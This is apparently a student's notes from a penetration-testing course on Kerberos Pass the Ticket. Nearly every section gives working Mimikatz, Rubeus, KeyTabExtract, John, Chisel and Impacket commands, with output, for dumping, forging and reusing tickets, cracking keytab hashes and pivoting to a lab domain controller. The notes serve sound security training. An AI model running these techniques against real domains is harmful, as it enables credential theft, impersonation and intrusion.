    > When a user requests a TGT, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.
    > If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication.

* Pass the Ticket (PtT) Attack
    > We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:
        + Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.
        + Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.
    > Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz and Rubeus.

* Scenario

    > Let's imagine we are on a pentest, and we manage to phish a user and gain access to the user's computer. We found a way to obtain administrative privileges on this computer and are working with local administrator rights. Let's explore several ways we can manage to get access tickets on this computer and how we can create new tickets.
    > Harvesting Kerberos Tickets from Windows
        + On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.
        + We can harvest all tickets from a system using the Mimikatz module sekurlsa::tickets /export. The result is a list of files with the extension .kirbi, which contain the tickets.
            privilege::debug
            sekurlsa::tickets /export 
            exit
            dir *.kirbi
            
            Directory: c:\tools
            Mode                LastWriteTime         Length Name
            ----                -------------         ------ ----
            
            <SNIP>
            
            -a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
            -a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi

        + The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.
        + Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
        + We can also export tickets using Rubeus and the option dump. This option can be used to dump all tickets (if running as a local administrator). Rubeus dump, instead of giving us a file, will print the ticket encoded in base64 format. We are adding the option /nowrap for easier copy-paste.
        + Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run "sekurlsa::ekeys" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.
        + Rubeus - Export tickets 
            c:\tools> Rubeus.exe dump /nowrap
        
        + Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.
        + This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.

* Pass the Key or OverPass the Hash
    > The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn't touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT). This technique was developed by Benjamin Delpy and Skip Duckwall in their presentation Abusing Microsoft Kerberos - Sorry you guys don't get it (https://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/18). Also Will Schroeder(https://twitter.com/harmj0y) adapted their project to create the Rubeus(https://github.com/GhostPack/Rubeus) tool.
    > To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.
    > Mimikatz - Extract Kerberos Keys
        privilege::debug
        sekurlsa::ekeys
    > Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.
    > Mimikatz - Pass the Key or OverPass the Hash
        privilege::debug
        sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
    > This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.
    > To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.
    > Rubeus - Pass the Key or OverPass the Hash
        c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
    > Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
    > To learn more about the difference between Mimikatz sekurlsa::pth and Rubeus asktgt, consult the Rubeus tool documentation Example for OverPass the Hash ==> (https://github.com/GhostPack/Rubeus#example-over-pass-the-hash)
    > Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade." 

* Pass the Ticket (PtT)

    > Now that we have some Kerberos tickets, we can use them to move laterally within an environment.
    > With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.
    > Rubeus Pass the Ticket
        c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
    > Note that now it displays Ticket successfully imported!.
    > Another way is to import the ticket into the current session using the .kirbi file from the disk.
    > Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.
    > Rubeus - Pass the Ticket
        c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

    > We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.
    > Convert .kirbi to Base64 Format
        PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
    > Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.
    > Pass the Ticket - Base64 Format
        c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
    > Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.
    > Mimikatz - Pass the Ticket
        kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
    > Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.

* Pass The Ticket with PowerShell Remoting (Windows)
    > PowerShell Remoting(https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.
    > To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.
    > Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.
    > Mimikatz - PowerShell Remoting with Pass the Ticket
        + To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new cmd.exe and execute mimikatz.exe, then import the ticket we collected using sekurlsa::tickets /export. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command Enter-PSSession to connect to the target machine.
        + Mimikatz - Pass the Ticket for Lateral Movement.
            kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
            exit
            c:\tools>powershell
            Windows PowerShell
            Copyright (C) 2015 Microsoft Corporation. All rights reserved.
            PS C:\tools> Enter-PSSession -ComputerName DC01
            [DC01]: PS C:\Users\john\Documents> whoami
            inlanefreight\john
            [DC01]: PS C:\Users\john\Documents> hostname
            DC01
            [DC01]: PS C:\Users\john\Documents>
    > Rubeus - PowerShell Remoting with Pass the Ticket
        + Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9 => https://eventlogxp.com/blog/logon-type-what-does-it-mean/). The process is hidden by default, but we can specify the flag /show to display the process, and the result is the equivalent of runas /netonly. This prevents the erasure of existing TGTs for the current logon session.
        + Create a Sacrificial Process with Rubeus
            C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
        + The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.
        + Rubeus - Pass the Ticket for Lateral Movement
            C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
            c:\tools>powershell
            Windows PowerShell
            Copyright (C) 2015 Microsoft Corporation. All rights reserved.
            PS C:\tools> Enter-PSSession -ComputerName DC01
            [DC01]: PS C:\Users\john\Documents> whoami
            inlanefreight\john
            [DC01]: PS C:\Users\john\Documents> hostname
            DC01

[+] Pass the ticket (PtT) from Linux
    > Although not common, Linux computers can connect to Active Directory to provide centralized identity management and integrate with the organization's systems, giving users the ability to have a single identity to authenticate on Linux and Windows computers.
    > A Linux computer connected to Active Directory commonly uses Kerberos as authentication. Suppose this is the case, and we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.
    > A Linux system can be configured in various ways to store Kerberos tickets. We'll discuss a few different storage options in this section.
    > Note: A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.

* Kerberos on Linux
    > Windows and Linux use the same process to request a Ticket Granting Ticket (TGT) and Service Ticket (TGS). However, how they store the ticket information may vary depending on the Linux distribution and implementation.
    > In most cases, Linux machines store Kerberos tickets as ccache(https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) files in the /tmp directory. By default, the location of the Kerberos ticket is stored in the environment variable KRB5CCNAME. This variable can identify if Kerberos tickets are being used or if the default location for storing Kerberos tickets is changed. These ccache files are protected by reading and write permissions, but a user with elevated privileges or root privileges could easily gain access to these tickets.
    > Another everyday use of Kerberos in Linux is with keytab(https://kb.iu.edu/d/aumh) files. A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password. However, when you change your password, you must recreate all your keytab files.
    > Keytab files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file. For example, a script can use a keytab file to access files stored in the Windows share folder.
    > Note: Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.




* Scenario

    > To practice and understand how we can abuse Kerberos from a Linux system, we have a computer (LINUX01) connected to the Domain Controller. This machine is only reachable through MS01. To access this machine over SSH, we can connect to MS01 via RDP and, from there, connect to the Linux machine using SSH from the Windows command line. Another option is to use a port forward.
        C:\Users\david>hostname
                        ssh david@inlanefreight.htb@172.16.1.15
    > As an alternative, we created a port forward to simplify the interaction with LINUX01. By connecting to port TCP/2222 on MS01, we will gain access to port TCP/22 on LINUX01.
    > Let's assume we are in a new assessment, and the company gives us access to LINUX01 and the user david@inlanefreight.htb and password Password2.
    > Linux Auth via Port Forward
        m1l0js@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222

* Identifying Linux and Active Directory Integration
    > We can identify if the Linux machine is domain join using realm (https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.
    > realm - Check If Linux Machine is Domain Joined
        david@inlanefreight.htb@linux01:~$ realm list
    > The output of the command indicates that the machine is configured as a Kerberos member. It also gives us information about the domain name (inlanefreight.htb) and which users and groups are permitted to log in, which in this case are the users David and Julio and the group Linux Admins.
    > In case realm is not available, we can also look for other tools used to integrate Linux with Active Directory such as sssd(https://sssd.io/) or winbind(https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). Looking for those services running in the machine is another way to identify if it is domain joined. We can read this blog post(https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) for more details. Let's search for those services to confirm if the machine is domain joined.
    > PS - Check if Linux Machine is Domain Joined
        david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"
    > id - Check if Linux Machine is Domain Joined
        id daygeek
            uid=1918901106(daygeek) gid=1918900513(domain users) groups=1918900513(domain users)
    > /etc/nsswitch.conf - Check if Linux Machine is Domain Joined
        # cat /etc/nsswitch.conf | grep -i "sss\|winbind\|ldap"
    > /etc/pam.d/system-auth or /etc/pam.d/system-auth-ac - Check if Linux Machine is Domain Joined
        # cat /etc/pam.d/system-auth  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.so"
        or
        # cat /etc/pam.d/system-auth-ac  | grep -i "pam_sss.so\|pam_winbind.so\|pam_ldap.

* Finding Kerberos Tickets in Linux
    > As an attacker, we are always looking for credentials. On Linux domain joined machines, we want to find Kerberos tickets to gain more access. Kerberos tickets can be found in different places depending on the Linux implementation or the administrator changing default settings. Let's explore some common ways to find Kerberos tickets.
    > Finding Keytab Files
        + A straightforward approach is to use find to search for files whose name contains the word keytab. When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to .keytab. Although not mandatory, it is a way in which administrators commonly refer to a keytab file.
        + Using Find to Search for Files with Keytab in the Name
            david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
        + Note: To use a keytab file, we must have read and write (rw) privileges on the file.
        + Another way to find keytab files is in automated scripts configured using a cronjob or any other Linux service. If an administrator needs to run a script to interact with a Windows service that uses Kerberos, and if the keytab file does not have the .keytab extension, we may find the appropriate filename within the script. Let's see this example:
        + Identifying Keytab Files in Cronjobs
            carlos@inlanefreight.htb@linux01:~$ crontab -l
            <SNIP>
            # m h  dom mon dow   command
            *5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
            carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
            #!/bin/bash
            kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
            smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
        + In the above script, we notice the use of kinit, which means that Kerberos is in use. kinit allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use kinit to import a keytab into our session and act as the user.
        + In this example, we found a script importing a Kerberos ticket (svc_workstations.kt) for the user svc_workstations@INLANEFREIGHT.HTB before trying to connect to a shared folder. We'll later discuss how to use those tickets and impersonate users.
        + Note: As we discussed in the Pass the Ticket from Windows section, a computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain joined machine needs a ticket. The ticket is represented as a keytab file located by default at /etc/krb5.keytab and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account LINUX01$.INLANEFREIGHT.HTB
    
    > Finding ccache Files
        + A credential cache or ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts. Once a user authenticates to the domain, a ccache file is created that stores the ticket information. The path to this file is placed in the KRB5CCNAME environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data. Let's look for the environment variables and identify the location of our Kerberos credentials cache:
        + Reviewing Environment Variables for ccache Files.
            david@inlanefreight.htb@linux01:~$ env | grep -i krb5
            KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
        + As mentioned previously, ccache files are located, by default, at /tmp. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their ccache file while it is still valid.
        + Searching for ccache Files in /tmp
            david@inlanefreight.htb@linux01:~$ ls -la /tmp
            drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
            drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
            -rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
            -rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
            -rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh

* Abusing KeyTab Files
    > As attackers, we may have several uses for a keytab file. The first thing we can do is impersonate a user using kinit. To use a keytab file, we need to know which user it was created for. klist is another application used to interact with Kerberos on Linux. This application reads information from a keytab file. Let's see that with the following command:
    > Listing keytab File Information
        david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 
        Keytab name: FILE:/opt/specialfiles/carlos.keytab
        KVNO Timestamp           Principal
        ---- ------------------- ------------------------------------------------------
           1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB

    > The ticket corresponds to the user Carlos. We can now impersonate the user with kinit. Let's confirm which ticket we are using with klist and then import Carlos's ticket into our session with kinit.
    > Note: kinit is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.

    > Impersonating a User with a keytab
        + david@inlanefreight.htb@linux01:~$ klist 
        Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
        Default principal: david@INLANEFREIGHT.HTB
        Valid starting     Expires            Service principal
        10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
                renew until 10/07/22 17:02:11

        + david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

        + david@inlanefreight.htb@linux01:~$ klist 
        Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
        Default principal: carlos@INLANEFREIGHT.HTB
        Valid starting     Expires            Service principal
        10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
                renew until 10/07/22 17:16:11

        + We can attempt to access the shared folder \\dc01\carlos to confirm our access.
        + Connecting to SMB Share as Carlos
            david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls
              .                                   D        0  Thu Oct  6 14:46:26 2022
              ..                                  D        0  Thu Oct  6 14:46:26 2022
              carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

        + Note: To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable KRB5CCNAME.

    > Keytab Extract
        + The second method we will use to abuse Kerberos on Linux is extracting the secrets from a keytab file. We were able to impersonate Carlos using the account's tickets to read a shared folder in the domain, but if we want to gain access to his account on the Linux machine, we'll need his password.
        + We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use KeyTabExtract(https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type .keytab files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type, and Hashes.
        + Extracting Keytab Hashes with KeyTabExtract
            david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
            [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
            [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
            [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
            [+] Keytab File successfully imported.
                    REALM : INLANEFREIGHT.HTB
                    SERVICE PRINCIPAL : carlos/
                    NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
                    AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
                    AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
        + With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
        + Note: A keypass file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
        + The most straightforward hash to crack is the NTLM hash. We can use tools like Hashcat or John the Ripper to crack it. However, a quick way to decrypt passwords is with online repositories such as https://crackstation.net/, which contains billions of passwords.
            john --format=NT -w=/usr/share/wordlists/rockyou.txt carloshash
        + As we can see in the image, the password for the user Carlos is Password5. We can now log in as Carlos.
        + Log in as Carlos
            david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
            Password: 
            carlos@inlanefreight.htb@linux01:~$ klist 
            Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
            Default principal: carlos@INLANEFREIGHT.HTB
            
            Valid starting       Expires              Service principal
            10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
                    renew until 10/08/2022 11:01:13
        + Obtaining More Hashes
        + Carlos has a cronjob that uses a keytab file named svc_workstations.kt. We can repeat the process, crack the password, and log in as svc_workstations.

* Abusing Keytab ccache
    > To abuse a ccache file, all we need is read privileges on the file. These files, located in /tmp, can only be read by the user who created them, but if we gain root access, we could use them.
    > Once we log in with the credentials for the user svc_workstations, we can use sudo -l and confirm that the user can execute any command as root. We can use the sudo su command to change the user to root.
    > Privilege Escalation to Root
        m1l0js@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
        svc_workstations@inlanefreight.htb@10.129.204.23's password: 
        Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)          
        ...SNIP...
        
        svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
        [sudo] password for svc_workstations@inlanefreight.htb: 
        Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
        
        User svc_workstations@inlanefreight.htb may run the following commands on linux01:
            (ALL) ALL
        svc_workstations@inlanefreight.htb@linux01:~$ sudo su
        root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
        root
    > As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.
    > Looking for ccache Files
        root@linux01:~# ls -la /tmp
        -rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
        -rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
        -rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
        -rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
        -rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
        -rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct  7 11:01 k
    > There is one user (julio@inlanefreight.htb) to whom we have not yet gained access. We can confirm the groups to which he belongs using id.
    > Identifying Group ZMembership with the id Command
        root@linux01:~# id julio@inlanefreight.htb
        uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
    > Julio is a member of the Domain Admins group. We can attempt to impersonate the user and gain access to the DC01 Domain Controller host.
    > To use a ccache file, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.
    > Importing the ccache File into our Current Session
        root@linux01:~# klist
        klist: No credentials cache found (filename: /tmp/krb5cc_0)
        root@linux01:~# cp /tmp/krb5cc_647401106_I8I133 .
        root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_I8I133
        root@linux01:~# klist
        Ticket cache: FILE:/root/krb5cc_647401106_I8I133
        Default principal: julio@INLANEFREIGHT.HTB
        
        Valid starting       Expires              Service principal
        10/07/2022 13:25:01  10/07/2022 23:25:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
                renew until 10/08/2022 13:25:01
        root@linux01:~# smbclient //dc01/C$ -k -c ls -no-pass
          $Recycle.Bin                      DHS        0  Wed Oct  6 17:31:14 2021
          Config.Msi                        DHS        0  Wed Oct  6 14:26:27 2021
          Documents and Settings          DHSrn        0  Wed Oct  6 20:38:04 2021
          john                                D        0  Mon Jul 18 13:19:50 2022
          julio                               D        0  Mon Jul 18 13:54:02 2022
          pagefile.sys                      AHS 738197504  Thu Oct  6 21:32:44 2022
          PerfLogs                            D        0  Fri Feb 25 16:20:48 2022
          Program Files                      DR        0  Wed Oct  6 20:50:50 2021
          Program Files (x86)                 D        0  Mon Jul 18 16:00:35 2022
          ProgramData                       DHn        0  Fri Aug 19 12:18:42 2022
          SharedFolder                        D        0  Thu Oct  6 14:46:20 2022
          System Volume Information         DHS        0  Wed Jul 13 19:01:52 2022
          tools                               D        0  Thu Sep 22 18:19:04 2022
          Users                              DR        0  Thu Oct  6 11:46:05 2022
          Windows                             D        0  Wed Oct  5 13:20:00 2022
    > Note: klist displays the ticket information. We must consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. ccache files are temporary. They may change or expire if the user no longer uses them or during login and logout operations.

[+] Using Linux Attack Tools with Kerberos

    > Most Linux attack tools that interact with Windows and Active Directory support Kerberos authentication. If we use them from a domain-joined machine, we need to ensure our KRB5CCNAME environment variable is set to the ccache file we want to use. In case we are attacking from a machine that is not a member of the domain, for example, our attack host, we need to make sure our machine can contact the KDC or Domain Controller, and that domain name resolution is working.
    > In this scenario, our attack host doesn't have a connection to the KDC/Domain Controller, and we can't use the Domain Controller for name resolution. To use Kerberos, we need to proxy our traffic via MS01 with a tool such as Chisel(https://github.com/jpillora/chisel) and Proxychains(https://github.com/haad/proxychains) and edit the /etc/hosts file to hardcode IP addresses of the domain and the machines we want to attack.

    > Host File Modified
        m1l0js@htb[/htb]$ cat /etc/hosts
        # Host addresses
        172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
        172.16.1.5  ms01.inlanefreight.htb  ms01
    > We need to modify our proxychains configuration file to use socks5 and port 1080.
    > Proxychains Configuration File
        m1l0js@htb[/htb]$ cat /etc/proxychains.conf
        <SNIP>
        [ProxyList]
        socks5 127.0.0.1 1080
    > We must download and execute chisel(https://github.com/jpillora/chisel) on our attack host.
    > Download Chisel to our Attack Host
        m1l0js@htb[/htb]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
        m1l0js@htb[/htb]$ gzip -d chisel_1.7.7_linux_amd64.gz
        m1l0js@htb[/htb]$ mv chisel_* chisel && chmod +x ./chisel
        m1l0js@htb[/htb]$ sudo ./chisel server --reverse 
        2022/10/10 07:26:15 server: Reverse tunneling enabled
        2022/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
        2022/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
    > Connect to MS01 via RDP and execute chisel (located in C:\Tools).
    > Connect to MS01 with xfreerdp
        m1l0js@htb[/htb]$ xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
    > Execute chisel from MS01
        C:\htb> c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
        2022/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
        2022/10/10 06:34:20 client: Connected (Latency 125.6177ms)
    > Note: The client IP is your attack host IP.
    > Finally, we need to transfer Julio's ccache file from LINUX01 and create the environment variable KRB5CCNAME with the value corresponding to the path of the ccache file.
    > Setting the KRB5CCNAME Environment Variable
        m1l0js@htb[/htb]$ export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

	> Another example ==> 
		AM: sudo ./chisel server --reverse -v -p 1234 --socks5
		VM: .\chisel.exe client -v 10.10.15.45:1234 R:socks

    > Impacket
        + To use the Kerberos ticket, we need to specify our target machine name (not the IP address) and use the option -k. If we get a prompt for a password, we can also include the option -no-pass.
        + Using Impacket with proxychains and Kerberos Authentication
            m1l0js@htb[/htb]$ proxychains impacket-wmiexec ms01 -k
            [proxychains] config file found: /etc/proxychains.conf
            [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
            [proxychains] DLL init: proxychains-ng 4.14
            Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
            
            [proxychains] Strict chain  ...  127.0.0.1:1080  ...  ms01:445  ...  OK
            [proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
            [*] SMBv3.0 dialect used
            [proxychains] Strict chain  ...  127.0.0.1:1080  ...  ms01:135  ...  OK
            [proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
            [proxychains] Strict chain  ...  127.0.0.1:1080  ...  MS01:50713  ...  OK
